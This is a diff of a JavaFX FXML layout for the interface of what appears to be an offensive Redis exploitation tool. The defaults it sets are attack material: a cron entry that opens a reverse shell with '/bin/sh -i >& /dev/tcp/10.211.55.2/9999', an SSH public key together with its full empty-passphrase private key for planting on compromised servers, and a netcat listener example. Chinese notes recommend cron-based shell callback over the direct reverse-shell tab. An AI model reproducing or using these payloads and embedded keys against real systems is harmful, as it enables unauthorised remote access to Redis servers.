@@ -11,8 +11,9 @@
 <?import javafx.scene.control.TitledPane?>
 <?import javafx.scene.layout.HBox?>
 <?import javafx.scene.layout.VBox?>
+<?import javafx.scene.text.Font?>
 
-<VBox prefHeight="771.0" prefWidth="898.0" xmlns="http://javafx.com/javafx/16" xmlns:fx="http://javafx.com/fxml/1" fx:controller="Controller.RedisController">
+<VBox prefHeight="771.0" prefWidth="898.0" xmlns="http://javafx.com/javafx/18" xmlns:fx="http://javafx.com/fxml/1" fx:controller="Controller.RedisController">
    <children>
       <TitledPane animated="false" collapsible="false" prefWidth="790.0" text="功能选择">
          <content>
@@ -91,7 +92,7 @@
                            <content>
                               <VBox prefHeight="200.0" prefWidth="100.0">
                                  <children>
-                                    <TextArea fx:id="redisCronTaskInput" prefHeight="345.0" prefWidth="888.0" text="* * * * * ? /bin/sh -i &gt;&amp; /dev/tcp/10.211.55.2/9999 0&gt;&amp;1">
+                                    <TextArea fx:id="redisCronTaskInput" prefHeight="345.0" prefWidth="888.0" text="*/1 * * * *  /bin/sh -i &gt;&amp; /dev/tcp/10.211.55.2/9999 0&gt;&amp;1" wrapText="true">
                                        <VBox.margin>
                                           <Insets bottom="5.0" left="5.0" right="5.0" top="5.0" />
                                        </VBox.margin>
@@ -109,7 +110,28 @@
                            <content>
                               <VBox prefHeight="200.0" prefWidth="100.0">
                                  <children>
-                                    <TextArea fx:id="redisPublicKeyInput" prefHeight="345.0" prefWidth="888.0" text="ssh-keygen -o 获取pub公钥">
+                                    <Label text="公钥">
+                                       <VBox.margin>
+                                          <Insets bottom="5.0" left="5.0" right="5.0" top="10.0" />
+                                       </VBox.margin>
+                                       <font>
+                                          <Font size="15.0" />
+                                       </font>
+                                    </Label>
+                                    <TextArea fx:id="redisPublicKeyInput" prefHeight="345.0" prefWidth="888.0" text="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDk4MhTlzMjBPTrN199hfxwFywjuqwv0d7PTjrC7Al8q0C/LIyZvVnqGmcTNKTeer9ch9ST2SmPGBni7EuvPEzAXB9z4deDRy1d8Fn8sDqC2HJ/xiwKNWjmmCxmbngUHrXBSAC8dGYrS3yZvdvKY6IUpesEnDh7duepf1Y3l7lEwSjK469zD07RhnhbAAIYbBgV5PY9F1N7AjzQbXpSRcw5FykbDMKKr0aulE4G6y0EqH9X3ToXPKWJNrg7WMyY6+HM0IXAfHp8RCm3pR2y973jH7ATuWVJWsCl311SHd2ozKLopvTpOfJJp35qQir967KKKUPAirTQD8SaAXMZFi+7 root@localhost.localdomain" wrapText="true">
+                                       <VBox.margin>
+                                          <Insets bottom="5.0" left="5.0" right="5.0" top="5.0" />
+                                       </VBox.margin>
+                                    </TextArea>
+                                    <Label text="私钥(空密码)">
+                                       <font>
+                                          <Font size="15.0" />
+                                       </font>
+                                       <VBox.margin>
+                                          <Insets bottom="5.0" left="5.0" right="5.0" top="5.0" />
+                                       </VBox.margin>
+                                    </Label>
+                                    <TextArea prefHeight="345.0" prefWidth="888.0" text="-----BEGIN OPENSSH PRIVATE KEY-----&#10;b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn&#10;NhAAAAAwEAAQAAAQEA5ODIU5czIwT06zdffYX8cBcsI7qsL9Hez046wuwJfKtAvyyMmb1Z&#10;6hpnEzSk3nq/XIfUk9kpjxgZ4uxLrzxMwFwfc+HXg0ctXfBZ/LA6gthyf8YsCjVo5pgsZm&#10;54FB61wUgAvHRmK0t8mb3bymOiFKXrBJw4e3bnqX9WN5e5RMEoyuOvcw9O0YZ4WwACGGwY&#10;FeT2PRdTewI80G16UkXMORcpGwzCiq9GrpROBustBKh/V906FzyliTa4O1jMmOvhzNCFwH&#10;x6fEQpt6Udsve94x+wE7llSVrApd9dUh3dqMyi6Kb06TnySad+akIq/euyiilDwIq00A/E&#10;mgFzGRYvuwAAA9DjxiUO48YlDgAAAAdzc2gtcnNhAAABAQDk4MhTlzMjBPTrN199hfxwFy&#10;wjuqwv0d7PTjrC7Al8q0C/LIyZvVnqGmcTNKTeer9ch9ST2SmPGBni7EuvPEzAXB9z4deD&#10;Ry1d8Fn8sDqC2HJ/xiwKNWjmmCxmbngUHrXBSAC8dGYrS3yZvdvKY6IUpesEnDh7duepf1&#10;Y3l7lEwSjK469zD07RhnhbAAIYbBgV5PY9F1N7AjzQbXpSRcw5FykbDMKKr0aulE4G6y0E&#10;qH9X3ToXPKWJNrg7WMyY6+HM0IXAfHp8RCm3pR2y973jH7ATuWVJWsCl311SHd2ozKLopv&#10;TpOfJJp35qQir967KKKUPAirTQD8SaAXMZFi+7AAAAAwEAAQAAAQB+vouw3pYO2nvWlb9n&#10;f38fg3WKA6G+iXXdTvDzaEqIoz0joMPrjxPvs9dIp2p1WXwG/aEWjreY6jvLkhcHX1kRXP&#10;J99Z6msA/LaYIrkFuWgc5GO7O/o3wH1lUgFCSi366+7eSad8rsRs0lRiIkna/vx0GyN+B/&#10;XoVDM6TG/Fo4W8Ks0Nea0e8w/JkBaOSlG7poLzIardkT5uLjvNU4gRlglzE/yLoNQE+LWl&#10;hduoVL6G8jfbQ5LTa2pc/nkJ3HoZUT4KtaK2QpXlbGUVmr24qwi3Ssf1pA81dp6rIpLsvN&#10;ka3bWds8eIgX6TQAhGYyFyNNmzDDdgxUIthxRoyGEZuhAAAAgEFTMvHx6nYJesUtAlMrL7&#10;Rjr+tIt/qVN5UQlG+OurXLbzhq5YzMNamVKu8/28chLqCKhM8QGSIyuIUc04vSbW32qZRX&#10;vbouJzc/UlyckkoDDVw227S4do0flgEXUsgVemY9ivtg2avde0WypaYLy1Qz76YuuQre7R&#10;84UC6qAgECAAAAgQD8ThbIbIfBAiHsQSMhUKQ+molaFwq0FW8B4wMWuJiVbKNHGfy3TxHX&#10;6B4M0ksBYN3RCzL/JWLvpsjeXV4UOcCZ6Xu7AlbiDPPZFLf2aMtDPYGKJLgBDCCj3a6URH&#10;H8pplnyxSy7trEVGnZsE7RsbVmAvxHVe8s873VneNGDsLA3QAAAIEA6DrdLgvoZ2NbVb5f&#10;3lb43QmjQurwIGoPyETbjhViti4aUEci4QImwJpRxiDwZO20UAgflLTWlE8VZ8gjB+Grr1&#10;ghpH2ZNNtOK2pabrkb3s/I8U/XVLfs4kEF5ao0aD5J8tHmLkubKXC7NBPe7ghfV8CpV/UR&#10;3kw6mFy0+b1znXcAAAAacm9vdEBsb2NhbGhvc3QubG9jYWxkb21haW4B&#10;-----END OPENSSH PRIVATE KEY-----&#10;" wrapText="true">
                                        <VBox.margin>
                                           <Insets bottom="5.0" left="5.0" right="5.0" top="5.0" />
                                        </VBox.margin>
@@ -123,7 +145,7 @@
                               </VBox>
                            </content>
                       </Tab>
-                        <Tab text="反弹 Shell">
+                        <Tab text="反弹 Shell (谨慎使用)">
                            <content>
                               <VBox prefHeight="200.0" prefWidth="100.0">
                                  <children>
@@ -174,7 +196,7 @@
                                           <Insets />
                                        </opaqueInsets>
                                     </HBox>
-                                    <TextArea fx:id="redisPublicKeyInput1" prefHeight="345.0" prefWidth="888.0" text="[root@VM-8-16-centos ~]# ncat -lvvp 9999&#10;Ncat: Version 7.91 ( https://nmap.org/ncat )&#10;Ncat: Listening on :::9999&#10;Ncat: Listening on 0.0.0.0:9999&#10;&#10;or&#10;&#10;[root@VM-8-16-centos ~]# nc -lvvp 9999&#10;Ncat: Version 7.50 ( https://nmap.org/ncat )&#10;Ncat: Listening on :::9999&#10;Ncat: Listening on 0.0.0.0:9999&#10;">
+                                    <TextArea fx:id="redisPublicKeyInput1" prefHeight="345.0" prefWidth="888.0" text="注意：该功能反弹成功后，结束终端的时候会把 Redis 一同杀死，强烈不建议使用，推荐使用计划任务反弹！&#10;注意：该功能反弹成功后，结束终端的时候会把 Redis 一同杀死，强烈不建议使用，推荐使用计划任务反弹！&#10;注意：该功能反弹成功后，结束终端的时候会把 Redis 一同杀死，强烈不建议使用，推荐使用计划任务反弹！&#10;&#10;[root@VM-8-16-centos ~]# ncat -lvvp 9999&#10;Ncat: Version 7.91 ( https://nmap.org/ncat )&#10;Ncat: Listening on :::9999&#10;Ncat: Listening on 0.0.0.0:9999&#10;">
                                        <VBox.margin>
                                           <Insets bottom="5.0" left="5.0" right="5.0" top="5.0" />
                                        </VBox.margin>
